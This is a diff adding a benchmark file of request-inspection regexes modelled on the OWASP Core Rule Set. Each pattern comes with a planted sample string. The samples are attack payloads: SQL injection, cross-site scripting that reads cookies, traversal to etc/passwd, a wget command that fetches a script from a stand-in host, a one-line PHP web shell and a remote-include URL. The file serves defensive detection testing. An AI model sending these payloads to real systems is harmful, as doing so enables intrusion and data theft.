@@ -1,0 +1,17 @@
+# Request-inspection patterns in the style of the OWASP Core Rule Set (written
+# for this benchmark, not copied from CRS), compiled in byte mode.
+# name<TAB>flags<TAB>pattern<TAB>sample (a string the pattern matches; planted in the corpus)
+# flags: - none, i ASCII case-insensitive, s dot matches every byte
+sqli_union	i	union[\s/*]+(all[\s/*]+)?select\b	1 UNION ALL SELECT password
+sqli_tautology	i	'\s*or\s+'?\d+'?\s*=\s*'?\d+	' or '1'='1
+sqli_sleep	i	\b(sleep|benchmark|pg_sleep)\s*\(\s*\d+	1;select pg_sleep(5)
+sqli_schema	i	information_schema\.(tables|columns)	information_schema.tables
+xss_script	i	<script[^>]*>	<script>alert(1)</script>
+xss_handler	i	\bon(load|error|mouseover|focus)\s*=	<img src=x onerror=alert(1)>
+xss_js_uri	i	javascript\s*:	javascript:alert(document.cookie)
+traversal	i	(\.\./|\.\.\\|%2e%2e(/|%2f))	%2e%2e%2f%2e%2e%2fetc%2fpasswd
+lfi_files	i	(etc/(passwd|shadow)|proc/self/environ|boot\.ini|win\.ini)	/proc/self/environ
+cmd_injection	i	[;|&`]\s*(cat|wget|curl|nc|bash|sh)\s	;wget http://example.test/x.sh -O-
+php_tag	i	<\?php\b	<?php system($_GET[c]); ?>
+scanner_ua	i	\b(nikto|sqlmap|nmap|masscan|wpscan)\b	sqlmap/1.8
+rfi	i	(https?|ftp)://[^&\s\x22]+\.(txt|php)\?	http://example.test/shell.txt?
